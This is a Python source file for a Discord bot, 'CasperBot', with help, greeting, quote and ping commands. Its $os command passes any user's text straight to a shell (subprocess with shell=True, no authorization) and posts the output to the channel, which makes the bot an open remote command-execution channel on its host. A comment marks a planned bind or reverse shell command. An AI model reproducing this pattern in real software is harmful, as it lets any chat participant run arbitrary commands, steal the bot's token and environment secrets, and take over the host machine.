#!/usr/bin/python3

import discord      # For discord api
import requests     # For doing http request and get data from the api: "https://apisecurity.io/"
import json         # For handling JSON data returned by api
import random       # For making data random
import os           # For OS related works
import subprocess   # Allows us to execute os cmds in an easier and controllable manner


from dotenv import load_dotenv      # Take environment variable from .env file
from discord.ext import commands    # Extended featured version of discord.Client
import logging                      # Logging module to log events


#########################################################################################

'''
1. Accessing env. var. from .env file
2. Connecting to discord server via TOKEN and GUILD name
3. Command regitration
4. Removing default help command to make our very own
5. Logging
6. Creating custom functions
7. Creating events
'''

#Search for variables by the given name in the host environment
load_dotenv()

#Variable name from .env file
TOKEN = os.getenv('DISCORD_TOKEN')
GUILD = os.getenv('DISCORD_GUILD')

#Registering a command
bot = commands.Bot(command_prefix = '$')

#Removing default help command to create our own
bot.remove_command('help')

'''
#Logging commands
logger = logging.getLogger('discord')
logger.setLevel(logging.INFO)
handler = logging.FileHandler(filename='discord.log', encoding='utf-8', mode='a')
handler.setFormatter(logging.Formatter('%(asctime)s:%(levelname)s:%(name)s: %(message)s'))
logger.addHandler(handler)

class logthis :
    def __init__(self):
        logging.basicConfig(level=logging.DEBUG,filename="socio-terminal.log",format="%(asctime)s [%(levelname)s] - [%(filename)s > %(funcName)s() > %(lineno)s] - %(message)s",datefmt="%H:%M:%S")
    def debug(self,msg):
        logging.debug(msg)
    def info(self,msg):
           logging.info(msg)
    def warning(self,msg):
           logging.warning(msg)
    def error(self,msg):
           logging.error(msg)
    def critical(self,msg):
           logging.critical(msg)
'''

#Getting motivational quotes using api
def get_motivation():
    #Capturing request
    response = requests.get("https://zenquotes.io/api/random")
    #Storing json data
    json_data = json.loads(response.text)

    #Getting motivation
    motivate = json_data[0]['q'] + " -" + json_data[0]['a']
    return(motivate)

#When Bot becomes ready
@bot.event
async def on_ready():

    #Checking GUILD/Server name
    for guild in bot.guilds:
        if guild.name == GUILD:
            break

    #Printing in console just to check everything is currect
    print(f'{bot.user} is connected to the following Discord guild:\n'
          f'{guild.name}(id: {guild.id})\n')


##########################################################################################

'''
All Discord Command related stuffs
'''

#1. help cmd
@bot.command()
async def help(ctx):
    await ctx.send('''

1. **$help**
-> _To list available commands_
2. **$hello**
-> _For building a rapport with me,_ the ***CasperBot***
3. **$motivate**
-> _Motivate members via random quotes_
4. **$ping**
-> _Checks latency_
5. **$os <cmd1> ... <cmdn>**
-> _interract with os_
''')

#2. hello cmd
@bot.command()
async def hello(ctx):
    await ctx.send("Hey! I'm CasperBot.\nType: **$help** to see my _serving menu_")

#3. motivate cmd
@bot.command()
async def motivate(ctx):
    motivate = get_motivation()
    await ctx.send(motivate)

#4. ping cmd
@bot.command()
async def ping(ctx):
    await ctx.send(f'**latency**: _{round(bot.latency * 1000)}ms_')
  
#5.1. OS cmd 
# Sending data chunk by chunk
def chunks(lst, n):
    for i in range(0, len(lst), n):
        yield lst[i:i+n]

#5.2. OS cmd
# System cmd
def SystemCmd(cmd):
    proc=subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

    result = proc.stdout.read() + proc.stderr.read()    # stdout and stderr
    result = result.decode('utf-8')                     # decoding result to utf-8
    return result

#5. OS cmd
@bot.command()
async def os(ctx, *args):
    no_of_args = len(args)
    cmd=' '.join(args)      # Converting to string
    
    result = SystemCmd(cmd)

    await ctx.send('***OUTPUT***')
    for chunk in chunks(result, 2000):
        await ctx.send(chunk)

#6. OS bind/rev shell cmd


#logging

bot.run(TOKEN)
